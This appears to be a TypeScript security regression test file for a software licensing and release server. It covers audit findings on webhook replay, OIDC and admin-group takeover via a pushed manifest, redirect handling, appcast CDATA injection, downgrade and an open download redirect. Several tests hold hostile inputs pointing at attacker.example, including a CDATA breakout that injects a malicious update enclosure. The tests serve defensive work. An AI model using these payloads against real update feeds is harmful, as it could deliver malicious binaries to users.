describe("R6-07 webhook resync trusts payload-supplied ref and has no replay protection", () => {
  // FIXED (R6-05): `resyncRepo` takes no ref at all — the Contents API resolves the
  // DB-configured repo's own default branch, so nothing in the payload steers which
  // commit's `.pkey/` is applied.
  it("payload.after is passed straight through to ?ref= (any branch / PR head / old sha)", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);
    stub.calls.length = 0;

    // A ref that was NEVER reviewed on the default branch.
    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ after: "refs/pull/9/head" }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const contents = stub.calls.filter((c) => c.url.includes("/contents/"));
    expect(contents.length).toBeGreaterThan(0);
    expect(contents.every((c) => !c.url.includes("ref="))).toBe(true);
    expect(contents.every((c) => !c.url.includes("pull"))).toBe(true);
  });

  // FIXED (R6-05): a delivery whose `installation.id` does not match the product's stored
  // `gh_installation_id` is refused, so one leaked webhook secret is no longer a
  // cross-tenant forgery capability.
  it("a delivery for the wrong installation id is refused", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);
    await db.run(
      "UPDATE release_config SET binary_name = ? WHERE product = ?",
      "acme-quarantined",
      "acme",
    );
    stub.calls.length = 0;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ installation: { id: 999999 } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    const body = (await res.json()) as {
      ok: boolean;
      products: Array<{ error?: string }>;
    };
    expect(body.ok).toBe(false);
    expect(body.products[0]?.error).toContain("installation id");
    // No manifest was fetched and the operator's quarantine survived.
    expect(stub.calls.filter((c) => c.url.includes("/contents/"))).toEqual([]);
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe(
      "acme-quarantined",
    );
  });

  it("REPLAY: re-posting one captured delivery re-runs the full destructive resync and reverts operator edits", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    // Capture ONE valid delivery (body + signature).
    const delivery = await signedPush(pushPayload(), "webhook-secret");
    const first = await handleGithubWebhook(
      deliveryRequest(delivery),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(first.status).toBe(200);

    // An operator responds to an incident: adds a tier and pins the OIDC issuer by hand.
    await db.run(
      `INSERT INTO tiers (product, id, label, profile_id, policy_expiry_days,
         policy_device_limit, channels_json, min_version, max_version,
         policy_fingerprint, modified_by, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?)`,
      "acme",
      "incident-lockdown",
      "Locked",
      null,
      null,
      // Was 0. R11-02: licenseCore gates the seat check on `limit > 0`, so a 0 here meant
      // UNLIMITED devices — the exact opposite of "incident lockdown" — and 0015 now rejects
      // it at the database. 1 is the tightest limit that actually means what this test says.
      1,
      null,
      null,
      null,
      null,
      "operator",
      NOW + 20,
    );
    await db.run(
      "UPDATE release_config SET binary_name = ? WHERE product = ?",
      "acme-quarantined",
      "acme",
    );

    // FIXED (R6-06): the delivery GUID is remembered in KV, so replaying the EXACT same
    // bytes + signature is ignored instead of re-running the destructive resync.
    const replay = await handleGithubWebhook(
      deliveryRequest(delivery),
      env,
      db,
      NOW + 30,
      stub.fetchImpl,
    );
    expect(replay.status).toBe(200);
    expect(await replay.json()).toMatchObject({
      ok: true,
      ignored: "duplicate-delivery",
    });

    // …and the operator's incident response survived.
    const tier = await db.first<{ id: string }>(
      "SELECT id FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "incident-lockdown",
    );
    expect(tier?.id).toBe("incident-lockdown");
    expect((await getReleaseConfig(db, "acme"))?.binary_name).toBe(
      "acme-quarantined",
    );
  });

  // PARTLY FIXED — splitting `.pkey/` into "repo may own" vs "admin only" (access gating,
  // admin_group, tiers) is fix direction #4 of R6-05 and is still open. The one piece that did
  // land is the OIDC issuer: R9-01 gates a *new or changed* `oidc_config.issuer` on the
  // operator's `OIDC_ISSUER_ALLOWLIST` at both ingest paths, and the gate runs before the
  // first write, so a push that tries to introduce an unlisted IdP applies nothing at all.
  it("a webhook push that repoints the IdP at an unlisted host is refused outright", async () => {
    const db = makeTestDb();
    const env = envFor(); // no OIDC_ISSUER_ALLOWLIST — the fail-closed default
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    stub.files[".pkey/product.json"] = ATTACKER_PRODUCT_JSON;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ head_commit: { modified: [".pkey/product.json"] } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200); // the webhook still ACKs; the resync inside it failed
    const oidc = await db.first<{ issuer: string; client_id: string }>(
      "SELECT * FROM oidc_config WHERE product = ?",
      "acme",
    );
    expect(oidc).toBeNull(); // no IdP introduced
    // ...and because the gate precedes every write, the rest of the hostile manifest — the
    // admin_group takeover included — never landed either.
    const product = await db.first<{ admin_group: string; name: string }>(
      "SELECT admin_group, name FROM products WHERE slug = ?",
      "acme",
    );
    expect(product?.admin_group).toBe("acme-admins");
    const tier = await db.first<{ policy_device_limit: number | null }>(
      "SELECT policy_device_limit FROM tiers WHERE product = ? AND id = ?",
      "acme",
      "pro",
    );
    expect(tier?.policy_device_limit).not.toBe(100000);
  });

  // STILL NOT FIXED (R6-05 proper): once the issuer host IS operator-blessed, everything else
  // in `.pkey/product` is still repo-owned with no admin-ownership flag — clientId, tiers and
  // `admin_group` are all rewritten by a push.
  it("a webhook push still rewrites clientId, tiers, and admin_group once the host is allowlisted", async () => {
    const db = makeTestDb();
    const env = envFor();
    env.GITHUB_WEBHOOK_SECRET = "webhook-secret";
    env.OIDC_ISSUER_ALLOWLIST = "idp.attacker.example";
    const stub = pkeyFetch({
      ".pkey/schema.json": SCHEMA_JSON,
      ".pkey/product.json": PRODUCT_JSON,
      ".pkey/release.json": releaseJson(),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    stub.files[".pkey/product.json"] = ATTACKER_PRODUCT_JSON;

    const res = await handleGithubWebhook(
      deliveryRequest(
        await signedPush(
          pushPayload({ head_commit: { modified: [".pkey/product.json"] } }),
          "webhook-secret",
        ),
      ),
      env,
      db,
      NOW + 10,
      stub.fetchImpl,
    );
    expect(res.status).toBe(200);
    const oidc = await db.first<{ issuer: string; client_id: string }>(
      "SELECT * FROM oidc_config WHERE product = ?",
      "acme",
    );
    expect(oidc?.issuer).toBe("https://idp.attacker.example");
    expect(oidc?.client_id).toBe("attacker-client");
    const product = await db.first<{ admin_group: string }>(
      "SELECT admin_group FROM products WHERE slug = ?",
      "acme",
    );
    expect(product?.admin_group).toBe("attacker-controlled-group");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-08 — streamAsset redirect handling
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-08 streamAsset redirect handling", () => {
  it("a relative Location raises an unhandled TypeError instead of a 404", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(null, {
            status: 302,
            headers: { Location: "/relative/redirect" },
          }),
      ],
    ]);
    await expect(
      handleRelease(
        req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
        envFor(),
        db,
        makeProduct(),
        "cli",
        { version: "1.2.3", arch: "arm64" },
        fetchImpl,
      ),
    ).rejects.toThrow(TypeError);
  });

  it("the storage re-fetch is issued WITHOUT redirect:'manual', so further hops are unguarded", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl, calls } = stubFetch([
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(rel), { status: 200 }),
      ],
      [
        "/releases/assets/777",
        () =>
          new Response(null, {
            status: 302,
            headers: { Location: "https://objects.githubusercontent.com/hop1" },
          }),
      ],
      [
        "objects.githubusercontent.com",
        () => new Response("BINARY", { status: 200 }),
      ],
    ]);
    const res = await handleRelease(
      req("https://key.plrs.im/djdl/cli/1.2.3/djdl-arm64"),
      envFor(),
      db,
      makeProduct(),
      "cli",
      { version: "1.2.3", arch: "arm64" },
      fetchImpl,
    );
    expect(res.status).toBe(200);
    const first = calls.find((c) => c.url.includes("/releases/assets/777"));
    const second = calls.find((c) =>
      c.url.includes("objects.githubusercontent.com"),
    );
    expect(first?.init?.redirect).toBe("manual");
    // The second hop uses the default "follow": any onward 302 is taken with no host check.
    expect(second?.init?.redirect).toBeUndefined();
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-09 — latent CDATA breakout in the appcast renderer
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-09 appcast <description> CDATA breakout (latent)", () => {
  it("descriptionHtml is neither escaped nor ]]>-neutralised", () => {
    const xml = renderAppcast({
      channelTitle: "djdl",
      link: "https://key.plrs.im",
      items: [
        {
          title: "djdl 1.2.3",
          shortVersion: "1.2.3",
          build: "1.2.3",
          url: "https://key.plrs.im/djdl/dmg/1.2.3/djdl-arm64.dmg",
          length: 1,
          pubDate: "Thu, 02 Jan 2026 03:04:05 GMT",
          descriptionHtml:
            ']]></description><enclosure url="https://attacker.example/evil.dmg" /><description><![CDATA[',
        },
      ],
    });
    // The CDATA section is terminated early and a second <enclosure> is injected.
    expect(xml).toContain(
      '<enclosure url="https://attacker.example/evil.dmg" />',
    );
    expect(xml).toContain("]]></description>");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-10 — no downgrade / rollback protection
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-10 downgrade: deleting the newest release silently makes an older one latest", () => {
  it("/version and the appcast follow the release list with no floor and no client-version input", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const env = envFor();

    let releases = [
      release({ tag_name: "v2.0.0" }),
      release({ tag_name: "v1.0.0" }),
    ];
    const fetchImpl: FetchImpl = async (input) => {
      const url = String(input);
      if (url.includes("/access_tokens"))
        return new Response(JSON.stringify({ token: "t" }), { status: 200 });
      if (url.includes("/releases?per_page"))
        return new Response(JSON.stringify(releases), { status: 200 });
      return new Response("nf", { status: 404 });
    };

    const before = await handleRelease(
      req(),
      env,
      db,
      makeProduct(),
      "version",
      { version: "latest" },
      fetchImpl,
    );
    expect(((await before.json()) as { version: string }).version).toBe(
      "2.0.0",
    );

    // The repo owner (or anyone who can delete a release) removes v2.0.0.
    releases = [release({ tag_name: "v1.0.0" })];

    const after = await handleRelease(
      req(),
      env,
      db,
      makeProduct(),
      "version",
      { version: "latest" },
      fetchImpl,
    );
    // Silent downgrade: no floor, no comparison against any client-reported version.
    expect(((await after.json()) as { version: string }).version).toBe("1.0.0");
    // …and the response is cacheable-public with no rollback marker.
    expect(after.headers.get("cache-control")).toContain("public");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R6-11 — portal /download/<token> open redirect + single-use TOCTOU
// ═════════════════════════════════════════════════════════════════════════════

describe("R6-11 portal download redirect has no host allowlist", () => {
  it("302s to an arbitrary off-platform source_url", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    const account = await getOrCreateAccountByEmail(db, "ada@example.com", NOW);
    await syncAccountLicenseLinks(db, account.id, NOW);

    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json, created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "1.2.3",
      "DJDL 1.2.3",
      null,
      null,
      "https://example.com/releases/1.2.3",
      "public",
      "public",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "art_1",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      123,
      "sha",
      // No allowlist is applied to this value anywhere on the redemption path.
      "https://attacker.example/pwned.dmg",
      null,
      null,
      "public",
      null,
      NOW,
    );

    const token = await createPortalDownloadToken(env, db, {
      accountId: account.id,
      product: SLUG,
      releaseId: "rel_1",
      artifactId: "art_1",
      now: NOW,
    });

    const res = await handlePortalDownload(
      new Request(
        `https://key.plrs.im/download/${token}`,
      ) as unknown as Request,
      env,
      db,
      token,
      NOW + 1,
    );
    expect(res.status).toBe(302);
    expect(res.headers.get("location")).toBe(
      "https://attacker.example/pwned.dmg",
    );
  });

  // FIXED (R9-05b / R11-05): the single-use marking is a conditional UPDATE now.
  it("TOCTOU: concurrent redemptions of a single-use token — only one wins", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
    await seedProduct(db, SLUG);
    await seedLicenseWithKey(db, SLUG);
    const account = await getOrCreateAccountByEmail(db, "ada@example.com", NOW);
    await syncAccountLicenseLinks(db, account.id, NOW);
    await db.run(
      `INSERT INTO release_metadata
         (product, release_id, version, title, notes, commit_sha, source_url,
          metadata_access, artifacts_access, published_at, metadata_json, created_at, modified_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "1.2.3",
      "DJDL 1.2.3",
      null,
      null,
      null,
      "public",
      "public",
      NOW,
      null,
      NOW,
      NOW,
    );
    await db.run(
      `INSERT INTO release_artifacts
         (product, release_id, artifact_id, name, kind, platform, arch, content_type,
          size_bytes, sha256, source_url, storage_key, sparkle_signature, access,
          metadata_json, created_at)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      SLUG,
      "rel_1",
      "art_1",
      "djdl.dmg",
      "dmg",
      "macos",
      "arm64",
      "application/octet-stream",
      123,
      "sha",
      "https://cdn.example/djdl.dmg",
      null,
      null,
      "public",
      null,
      NOW,
    );
    const token = await createPortalDownloadToken(env, db, {
      accountId: account.id,
      product: SLUG,
      releaseId: "rel_1",
      artifactId: "art_1",
      now: NOW,
    });
    // better-sqlite3 is synchronous, so model D1's real async round-trips: every DB call
    // yields to the event loop before running. Nothing about the handler changes.
    const asyncDb = new Proxy(db, {
      get(target, prop, receiver) {
        const value = Reflect.get(target, prop, receiver);
        if (typeof value !== "function") return value;
        return async (...args: unknown[]) => {
          await new Promise((r) => setTimeout(r, 0));
          return (value as (...a: unknown[]) => unknown).apply(target, args);
        };
      },
    }) as Db;

    const fire = (): Promise<Response> =>
      handlePortalDownload(
        new Request(
          `https://key.plrs.im/download/${token}`,
        ) as unknown as Request,
        env,
        asyncDb,
        token,
        NOW + 1,
      );
    // Both still interleave between the `used_at` read and `markPortalDownloadUsed` — the
    // database, not the ordering, is what decides which one gets the redirect.
    const [a, b] = await Promise.all([fire(), fire()]);
    expect([a.status, b.status].sort()).toEqual([302, 404]);
  });
});
